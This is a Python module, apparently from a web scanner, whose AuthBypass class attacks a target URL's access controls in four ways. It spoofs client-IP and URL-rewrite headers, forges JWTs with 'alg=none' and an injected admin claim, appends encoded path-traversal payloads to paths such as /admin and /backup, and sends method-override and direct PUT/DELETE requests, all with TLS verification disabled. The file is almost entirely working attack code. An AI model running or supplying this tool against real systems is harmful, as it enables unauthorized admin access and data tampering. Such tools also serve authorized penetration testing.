import requests
import base64
import json
from typing import Dict, List, Optional
from config import config


class AuthBypass:
    def __init__(self, threads: int = None, timeout: int = None, proxy: str = None):
        self.threads = threads or config.MAX_THREADS
        self.timeout = timeout or config.TIMEOUT
        self.proxy = proxy or config.PROXY_URL
        self.results = []
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        })
        if self.proxy:
            self.session.proxies = {"http": self.proxy, "https": self.proxy}

    def bypass_header_manipulation(self, url: str) -> Dict:
        self.results = []
        headers_to_test = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-For": "127.0.0.1, 10.0.0.1"},
            {"X-Forwarded-For": "127.0.0.1, 10.0.0.1, 192.168.1.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Real-IP": "10.0.0.1"},
            {"X-Original-URL": "/admin"},
            {"X-Original-URL": "/admin/"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Forwarded-Host": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Host": "127.0.0.1"},
            {"X-Forwarded-Server": "127.0.0.1"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-True-Client-IP": "127.0.0.1"},
            {"CF-Connecting-IP": "127.0.0.1"},
            {"True-Client-IP": "127.0.0.1"},
            {"X-Forwarded-For": "1.1.1.1"},
            {"X-Real-IP": "1.1.1.1"},
            {"X-Original-URL": "/"},
            {"X-Rewrite-URL": "/"},
        ]

        try:
            baseline_response = self.session.get(url, timeout=self.timeout, verify=False, allow_redirects=False)
            baseline_status = baseline_response.status_code
            baseline_length = len(baseline_response.text)
        except requests.RequestException as e:
            return {"error": str(e), "results": [], "target": url}

        for headers in headers_to_test:
            try:
                response = self.session.get(url, headers=headers, timeout=self.timeout, verify=False, allow_redirects=False)
                header_name = list(headers.keys())[0]
                header_value = headers[header_name]

                is_different = (
                    response.status_code != baseline_status
                    or abs(len(response.text) - baseline_length) > 100
                )

                if is_different or response.status_code == 200:
                    self.results.append({
                        "type": "header_manipulation",
                        "header": header_name,
                        "value": header_value,
                        "url": url,
                        "status_code": response.status_code,
                        "baseline_status": baseline_status,
                        "response_size": len(response.text),
                        "baseline_size": baseline_length,
                        "changed": is_different,
                    })

            except requests.RequestException:
                continue

        return {
            "scan_type": "auth_bypass_header",
            "target": url,
            "total_tested": len(headers_to_test),
            "successful": len([r for r in self.results if r.get("changed")]),
            "results": self.results,
        }

    def bypass_jwt_none(self, url: str, token: str) -> Dict:
        self.results = []
        header_payload = token.split(".")
        if len(header_payload) != 3:
            return {"error": "Invalid JWT format", "results": [], "target": url}

        try:
            payload_bytes = base64.urlsafe_b64decode(header_payload[1] + "==")
            payload = json.loads(payload_bytes)
        except Exception:
            payload = {}

        none_algorithms = ["none", "None", "NONE", "nOnE"]
        modified_tokens = []

        for alg in none_algorithms:
            header = {"alg": alg, "typ": "JWT"}
            header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
            modified_token = f"{header_b64}.{header_payload[1]}.{header_payload[2]}"
            modified_tokens.append((f"alg={alg}", modified_token))

        no_sig_token = f"{header_payload[0]}.{header_payload[1]}."
        modified_tokens.append(("no_signature", no_sig_token))

        empty_payload = base64.urlsafe_b64encode(json.dumps({"sub": "1", "admin": True}).encode()).rstrip(b"=").decode()
        for alg in none_algorithms:
            header = {"alg": alg, "typ": "JWT"}
            header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
            modified_token = f"{header_b64}.{empty_payload}."
            modified_tokens.append((f"alg={alg}_admin_payload", modified_token))

        try:
            baseline_response = self.session.get(
                url,
                headers={"Authorization": f"Bearer {token}"},
                timeout=self.timeout,
                verify=False,
                allow_redirects=False,
            )
            baseline_status = baseline_response.status_code
        except requests.RequestException:
            baseline_status = 401

        for desc, modified_token in modified_tokens:
            try:
                response = self.session.get(
                    url,
                    headers={"Authorization": f"Bearer {modified_token}"},
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=False,
                )

                bypassed = response.status_code in (200, 302) and response.status_code != baseline_status
                self.results.append({
                    "type": "jwt_none_bypass",
                    "description": desc,
                    "url": url,
                    "status_code": response.status_code,
                    "baseline_status": baseline_status,
                    "bypassed": bypassed,
                    "response_size": len(response.text),
                })

            except requests.RequestException:
                continue

        return {
            "scan_type": "auth_bypass_jwt",
            "target": url,
            "total_tested": len(modified_tokens),
            "successful": len([r for r in self.results if r.get("bypassed")]),
            "results": self.results,
        }

    def bypass_path_traversal(self, url: str) -> Dict:
        self.results = []
        traversal_payloads = [
            "/",
            "/%2e/",
            "/%2e%2e/",
            "/..%2f",
            "/..%252f",
            "/..;/",
            "/..%00/",
            "/.../.../",
            ";/",
            "/./",
            "/../",
            "%2e%2e%2f",
            "..%252f..%252f",
            "%2e%2e/",
            "/..%00",
            "/%2e%2e%2f",
            "/..%5c",
            "/..%2f",
            "/..%00/",
            "/..%0d/",
            "/..%0a/",
            "....//",
            "..\\",
            "%252e%252e%252f",
        ]

        protected_paths = ["/admin", "/dashboard", "/config", "/settings", "/backup"]

        try:
            parsed_url = url.rstrip("/")
        except Exception:
            return {"error": "Invalid URL", "results": [], "target": url}

        for protected in protected_paths:
            for traversal in traversal_payloads:
                test_url = f"{parsed_url}{protected}{traversal}"
                try:
                    response = self.session.get(test_url, timeout=self.timeout, verify=False, allow_redirects=False)
                    if response.status_code in (200, 301, 302) and response.status_code != 404:
                        self.results.append({
                            "type": "path_traversal",
                            "url": test_url,
                            "payload": traversal,
                            "protected_path": protected,
                            "status_code": response.status_code,
                            "response_size": len(response.text),
                        })
                except requests.RequestException:
                    continue

        return {
            "scan_type": "auth_bypass_path_traversal",
            "target": url,
            "total_tested": len(protected_paths) * len(traversal_payloads),
            "successful": len(self.results),
            "results": self.results,
        }

    def bypass_method_override(self, url: str) -> Dict:
        self.results = []
        override_headers = [
            {"X-HTTP-Method-Override": "PUT"},
            {"X-HTTP-Method-Override": "DELETE"},
            {"X-HTTP-Method-Override": "PATCH"},
            {"X-HTTP-Method": "PUT"},
            {"X-HTTP-Method": "DELETE"},
            {"X-HTTP-Method": "PATCH"},
            {"X-Method-Override": "PUT"},
            {"X-Method-Override": "DELETE"},
        ]

        override_params = [
            {"_method": "PUT"},
            {"_method": "DELETE"},
            {"_method": "PATCH"},
            {"_method": "PUT", "_METHOD": "PUT"},
        ]

        try:
            baseline_response = self.session.get(url, timeout=self.timeout, verify=False, allow_redirects=False)
            baseline_status = baseline_response.status_code
            baseline_length = len(baseline_response.text)
        except requests.RequestException as e:
            return {"error": str(e), "results": [], "target": url}

        for headers in override_headers:
            try:
                response = self.session.get(url, headers=headers, timeout=self.timeout, verify=False, allow_redirects=False)
                header_name = list(headers.keys())[0]

                is_different = (
                    response.status_code != baseline_status
                    or abs(len(response.text) - baseline_length) > 100
                )

                if is_different:
                    self.results.append({
                        "type": "method_override_header",
                        "header": header_name,
                        "value": headers[header_name],
                        "url": url,
                        "status_code": response.status_code,
                        "baseline_status": baseline_status,
                        "changed": True,
                    })
            except requests.RequestException:
                continue

        for params in override_params:
            try:
                response = self.session.get(url, params=params, timeout=self.timeout, verify=False, allow_redirects=False)
                param_name = list(params.keys())[0]

                is_different = (
                    response.status_code != baseline_status
                    or abs(len(response.text) - baseline_length) > 100
                )

                if is_different:
                    self.results.append({
                        "type": "method_override_param",
                        "param": param_name,
                        "value": params[param_name],
                        "url": url,
                        "status_code": response.status_code,
                        "baseline_status": baseline_status,
                        "changed": True,
                    })
            except requests.RequestException:
                continue

        for method in ["PUT", "DELETE", "PATCH"]:
            try:
                response = self.session.request(method, url, timeout=self.timeout, verify=False, allow_redirects=False)
                is_different = response.status_code != baseline_status

                if is_different:
                    self.results.append({
                        "type": "method_direct",
                        "method": method,
                        "url": url,
                        "status_code": response.status_code,
                        "baseline_status": baseline_status,
                        "changed": True,
                    })
            except requests.RequestException:
                continue

        return {
            "scan_type": "auth_bypass_method_override",
            "target": url,
            "total_tested": len(override_headers) + len(override_params) + 3,
            "successful": len(self.results),
            "results": self.results,
        }
